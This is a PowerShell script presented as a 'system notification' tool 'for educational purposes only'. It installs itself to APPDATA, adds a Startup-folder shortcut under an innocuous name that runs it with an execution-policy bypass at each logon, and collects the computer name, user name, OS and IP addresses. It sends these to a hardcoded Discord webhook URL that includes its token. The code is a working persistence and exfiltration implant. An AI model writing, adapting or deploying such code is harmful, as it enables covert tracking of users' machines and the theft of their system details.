# k.ps1
# System Notification Script That Won't Self-Close
# For educational purposes only

# === Configuration ===
$scriptPath = "$env:APPDATA\k.ps1"
$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$startupShortcut = "$startupFolder\SystemStartup.lnk"
$webhookUrl = "https://discord.com/api/webhooks/1363942155105865909/xfuFLDF6gBZ62O9ij5vh-FH4BnCqdl5lZLCYvmqvwsmH7fcHh34kqFxmhigqiWVUyBiT"
$logFile = "$env:APPDATA\system_log.txt"

# === Create a batch launcher that forces window to stay open ===
$batchLauncherPath = "$env:APPDATA\run_k.bat"
$batchContent = @"
@echo off
echo Starting PowerShell script with debug output...
powershell.exe -ExecutionPolicy Bypass -File "$scriptPath"
echo.
echo Execution completed. Check above for any error messages.
pause
"@
$batchContent | Out-File $batchLauncherPath -Encoding ASCII -Force

# === Create the main PowerShell script content ===
$scriptContent = @'
# System Notification Script - Forced to stay open
$ErrorActionPreference = "Continue"
$logFile = "$env:APPDATA\system_log.txt"
$webhookUrl = "WEBHOOK_URL_PLACEHOLDER"

# Start with clearing the screen for better readability
Clear-Host
Write-Host "=== System Notification Script ===" -ForegroundColor Cyan
Write-Host "Script started at $(Get-Date)" -ForegroundColor Cyan
Write-Host "----------------------------------------" -ForegroundColor Cyan

function Send-DiscordNotification {
    param (
        [string]$content
    )
    
    Write-Host "Attempting to send notification to Discord..." -ForegroundColor Yellow
    
    $payload = @{
        content = $content
    } | ConvertTo-Json
    
    try {
        Write-Host "Sending payload to webhook..." -ForegroundColor Yellow
        $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
        Write-Host "Successfully sent notification to Discord!" -ForegroundColor Green
        "$(Get-Date) - Successfully sent notification" | Out-File $logFile -Append
        return $true
    }
    catch {
        Write-Host "ERROR: Failed to send to Discord webhook:" -ForegroundColor Red
        Write-Host $_.Exception.Message -ForegroundColor Red
        Write-Host "Status: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Red
        
        "$(Get-Date) - Error sending notification: $($_.Exception.Message)" | Out-File $logFile -Append
        return $false
    }
}

try {
    # Test if we can write to log file
    Write-Host "Testing log file access..." -ForegroundColor Yellow
    "$(Get-Date) - Script started" | Out-File $logFile -Append
    Write-Host "Log file accessible." -ForegroundColor Green
    
    # Test webhook URL formatting
    Write-Host "Checking webhook URL format..." -ForegroundColor Yellow
    if ($webhookUrl -match "^https://discord.com/api/webhooks/") {
        Write-Host "Webhook URL format looks correct." -ForegroundColor Green
    } else {
        Write-Host "WARNING: Webhook URL doesn't match expected Discord format." -ForegroundColor Red
    }
    
    # Collect system information
    Write-Host "Collecting system information..." -ForegroundColor Yellow
    
    $computerInfo = @(
        "**System Started**",
        "Computer: $env:COMPUTERNAME",
        "User: $env:USERNAME",
        "Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')",
        "OS: $([System.Environment]::OSVersion.VersionString)"
    )
    
    # Try to get IP address safely
    Write-Host "Attempting to get IP addresses..." -ForegroundColor Yellow
    try {
        $ipAddresses = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike '*Loopback*'}).IPAddress -join ', '
        $computerInfo += "IP: $ipAddresses"
        Write-Host "Successfully retrieved IP: $ipAddresses" -ForegroundColor Green
    }
    catch {
        $computerInfo += "IP: Unable to retrieve"
        Write-Host "Failed to get IP addresses: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # Send the notification
    Write-Host "----------------------------------------" -ForegroundColor Cyan
    Write-Host "Sending system info to Discord..." -ForegroundColor Yellow
    Send-DiscordNotification -content ($computerInfo -join "`n")
}
catch {
    Write-Host "----------------------------------------" -ForegroundColor Red
    Write-Host "CRITICAL ERROR IN MAIN SCRIPT:" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    Write-Host $_.ScriptStackTrace -ForegroundColor Red
    "$(Get-Date) - Critical error: $($_.Exception.Message)" | Out-File $logFile -Append
}
finally {
    Write-Host "----------------------------------------" -ForegroundColor Cyan
    Write-Host "Script execution finished." -ForegroundColor Cyan
    Write-Host "Log file location: $logFile" -ForegroundColor Cyan
    Write-Host "----------------------------------------" -ForegroundColor Cyan
    
    # This section ensures the script doesn't close automatically
    Write-Host "Press Enter to close this window..." -ForegroundColor Yellow
    Read-Host
}
'@

# Replace the placeholder with the actual webhook URL
$scriptContent = $scriptContent -replace "WEBHOOK_URL_PLACEHOLDER", $webhookUrl

# Create the script file
$scriptContent | Out-File $scriptPath -Encoding UTF8 -Force

# Create the regular startup shortcut
if (-not (Test-Path $startupFolder)) {
    New-Item -ItemType Directory -Path $startupFolder -Force | Out-Null
}

$WshShell = New-Object -ComObject WScript.Shell
$shortcut = $WshShell.CreateShortcut($startupShortcut)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
$shortcut.WorkingDirectory = Split-Path $scriptPath -Parent
$shortcut.WindowStyle = 1  # Normal window
$shortcut.Save()

Write-Host "Script files created:"
Write-Host "- Main script: $scriptPath"
Write-Host "- Batch launcher: $batchLauncherPath"
Write-Host "- Startup shortcut: $startupShortcut"
Write-Host ""
Write-Host "To debug: Run the run_k.bat file from your AppData folder"
Write-Host "The window will stay open so you can read error messages"
